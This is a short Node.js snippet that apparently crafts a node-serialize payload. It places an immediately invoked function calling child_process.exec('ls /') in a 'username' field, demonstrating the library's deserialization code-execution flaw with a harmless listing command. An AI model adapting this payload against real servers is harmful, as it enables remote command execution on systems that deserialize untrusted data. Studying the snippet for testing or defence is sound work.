var y = 
  {
    "username": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}(),
    "country":"Idk Probably Somewhere Dumb",
    "city":"Lametown",
    "num":"100"
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
